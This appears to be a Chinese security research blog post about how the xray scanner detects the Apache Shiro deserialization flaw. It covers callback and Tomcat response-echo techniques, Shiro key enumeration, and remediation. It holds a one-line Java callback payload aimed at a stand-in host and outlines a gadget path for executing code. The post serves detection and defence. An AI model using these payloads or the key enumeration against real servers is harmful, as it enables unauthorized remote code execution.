我们最终的目的是实现 Shiro 反序列化漏洞的可靠检测，回顾一下漏洞检测常用的两种方法，一是回显，二是反连。基于上面的研究，我们可以借助
`TemplatesTmpl` 实现任意的代码执行，仅需一行代码就可以实现一个 HTTP 反连的 Payload
    new URL("http://REVERSE-HOST").openConnection().getContent();
当漏洞存在时，反连平台就会收到一条 HTTP 的请求。与之类似的还有 `URLDNS`这个利用链，只不过它的反连是基于 DNS 请求。实战中常用的还有
JRMP 相关的方法，我们可以使用类似 fastjson 的方法来做 Shiro
的检测。可惜的是，这些方法在目标网站无法出网时都束手无策，而漏洞回显是解决这个问题的不二法门。
与 Shiro 搭配最多的 Web 中间件是 Tomcat，因此我们的注意力就转移到了 Tomcat
回显上。这个话题实际上已经有很多师傅研究过了，李三师傅甚至整理了一个 [Tomcat
不出网回显的连续剧](https://xz.aliyun.com/t/7535)的文章。在学习了各位师傅的成果后，我发现公开的 Payload
都有这样一个问题——无法做到全版本 Tomcat 回显。此时我便萌生了一个想法，能否挖到一个新的利用链，使它能兼容所有的 Tomcat
大版本，基于此的漏洞检测就可以不费吹灰之力完成。然而挖掘新的利用链谈何容易，我怕是要陷入阅读 Tomcat
源码的漩涡中还不一定爬的出来，要是这个过程能自动完成就好了！自动化利用链挖掘应该有人做过吧，我不会是第一个吧，不会吧不会吧。
本着不重复造轮子的原则，稍加寻找不难发现，除了有大名鼎鼎的
[gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector) ，还有
c0y1 师傅写的 [java-object-searcher](https://github.com/c0ny1/java-object-searcher) ，一款内存对象搜索工具，非常符合我目前的需求。借助这个工具，我发现了一条在 Tomcat6,7,8,9
全版本都存在的利用链，只是不同版本的变量获取略有差异，大致流程如下:
    currentThread -> threadGroup ->
      for(threads) -> target -> this$0 -> handler -> global -> 
        for(processors) -> req -> response
一些细节的坑点就不展开说了，总之就是各种反射各种 try/catch，我尽了最大的努力来提高其对各种 Tomcat
环境的兼容性，文章最后会将这个成果分享给大家。有了这个比较好用的回显 payload，搭配 K1/K2 来触发反序列化流程，就打造成了 xray
高级版/商业版中 Shiro 反序列化回显检测的核心逻辑，回显效果如下:
## 更上一层楼
使用 xray 扫到过 xss 的同学应该都有所体会，xray 扫到的 xss 漏洞不一定可以直接弹框，但相关参数一定存在可控的代码注入，经常会遇到网站存在
waf 但 xray 依然可以识别出 xss 的情况。纵观整个 Shiro 反序列化的流程，步步都是在针尖上跳舞，一步出错便前功尽弃。倘若目标站点部署了
RASP 等主机防护手段，很有可能导致反序列化中断而与 RCE 擦肩而过，有没有什么办法能够像 xss 一样大幅的提高其检测能力的下限呢？和 l1nk3r
师傅交流了一下，他提到一种检测 Shiro Key 的方法很不错，据说原理来自 `shiro_tool.jar`，详情可以参考这篇文章 [一种另类的
shiro 检测方式](https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ)，我这里简单复述一下结论。
> 使用一个空的 `SimplePrincipalCollection`作为
> payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
Key 错误时
Key 正确时
借助这种方法，我们就可以将 Shiro 的检测拆为两步
  1. 探测 Shiro Key，如果探测成功，则报出秘钥可被枚举的漏洞；如果探测失败直接结束逻辑
  2. 利用上一步获得的 Shiro Key，尝试 Tomcat 回显，如果成功再报出一个远程代码执行的漏洞
由于第一步的检测依靠的是 Shiro 本身的代码逻辑，可以完全不受环境的影响，只要目标使用的秘钥在我们待枚举的列表里，那么就至少可以把 Key
枚举出来，这就很大的提高了漏洞检测的下限。另外有个小插曲是，有的网站没法根据是否存在 `deleteMe`来判断，而是需要根据
`deleteMe`的数量来判断，举个例子，如果秘钥错误，返回的是两个 `deleteMe`，反之返回的是一个
`deleteMe`。这种情况我之前没有考虑到，所以在 xray 后续又发了一个小版本修复了一下这个问题。
## 万剑归宗
看到这想必你已修得三十年功力，迫不及待的想要冲入江湖大展拳脚。但好马需有好鞍相配，漏洞测试也需要一款好用趁手的工具做辅助。将上面说的整个流程做自动化检测并非只是发个请求那么简单，我随便列举几个细节，大家可以思考下这几个小问题该如何处理：
  * 如何判断目标是 Shiro 的站点，Nginx 反代动静分离的站点又该怎么识别？
  * 如何避免 Java 依赖而纯粹使用其他语言实现？
  * 如何避免 Payload 太长以致超过 Tomcat Header 的大小限制？
  * 如何使 Payload 兼容 JDK6 的环境？
  * `CommonsBeanutils`中有个类的 `serialVersionUID`没设置会对 gadget 有什么影响？
  * 如何识别并处理 Cookie key 不是 `rememberMe`的情况？
我自认为相对科学的解决了这几个小问题，并将上述所有的研究成果凝结在了 xray 的 Shiro
检测插件中，如果有什么我没有注意到的细节，还望各位师傅指正。xray 是站在巨人的肩膀，若取之社区则要用之社区，文中提到的相关 Gadget 和
Payload 我都同步放到了
，欢迎大家和我一起研究讨论。唯一希望的是，转载或二次研究时请保留下版权，免费的还想白嫖，不是吧，阿Sir。
最后我们来讲讲这个漏洞的修复方法。官方推荐的方式是弃用默认秘钥，自己随机生成一个，这种方法固然有效，但我感觉可以在代码层面做的更好。如果能在
`resolveClass`里采用白名单的方式校验一下要加载的类，是不是就可以完全避免恶意反序列化的发生，既然已有无心插柳的有效性在前，何不顺水推舟，将这个问题从源码层面根治。
安全之路漫漫，唯有繁星相伴。愿诸位都能成为暗黑森林中的一颗闪亮的星，共勉。
* * *